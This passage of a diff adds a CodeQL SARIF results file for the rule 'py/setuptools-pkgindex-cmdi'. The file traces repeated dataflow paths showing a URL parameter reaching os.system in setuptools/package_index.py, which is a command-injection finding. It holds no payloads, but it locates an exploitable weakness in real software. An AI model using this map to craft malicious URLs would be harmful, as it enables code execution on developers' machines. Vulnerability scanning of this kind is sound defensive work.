+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 886,
+              "startColumn": 19,
+              "endColumn": 62
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 886,
+              "startColumn": 19,
+              "endColumn": 62
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      }
+     ],
+     "relatedLocations": [
+      {
+       "id": 1,
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 886,
+         "startColumn": 19,
+         "endColumn": 62
+        }
+       },
+       "message": {
+        "text": "command"
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 817,
+         "startColumn": 37,
+         "endColumn": 40
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 864,
+         "startColumn": 33,
+         "endColumn": 36
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 881,
+         "startColumn": 29,
+         "endColumn": 32
+        }
+       }
+      }
+     ]
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-cmdi",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-cmdi",
+      "index": 0
+     },
+     "message": {
+      "text": "URL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1)."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 891,
+         "startColumn": 17,
+         "endLine": 895,
+         "endColumn": 18
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "6e510f64c622b84b:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     },
+     "codeFlows": [
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 837,
+              "startColumn": 39,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 891,
+              "startColumn": 17,
+              "endLine": 895,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 837,
+              "startColumn": 39,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 9,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 13,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 21,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute() [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 891,
+              "startColumn": 17,
+              "endLine": 895,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 891,
+              "startColumn": 17,
+              "endLine": 895,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 891,
+              "startColumn": 17,
+              "endLine": 895,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      }
+     ],
+     "relatedLocations": [
+      {
+       "id": 1,
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 891,
+         "startColumn": 17,
+         "endLine": 895,
+         "endColumn": 18
+        }
+       },
+       "message": {
+        "text": "command"
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 817,
+         "startColumn": 37,
+         "endColumn": 40
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 864,
+         "startColumn": 33,
+         "endColumn": 36
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 881,
+         "startColumn": 29,
+         "endColumn": 32
+        }
+       }
+      }
+     ]
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-cmdi",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-cmdi",
+      "index": 0
+     },
+     "message": {
+      "text": "URL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1)."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 905,
+         "startColumn": 19,
+         "endColumn": 61
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "d1121df9f941f469:1",
+      "primaryLocationStartColumnFingerprint": "10"
+     },
+     "codeFlows": [
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 839,
+              "startColumn": 38,
+              "endColumn": 41
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
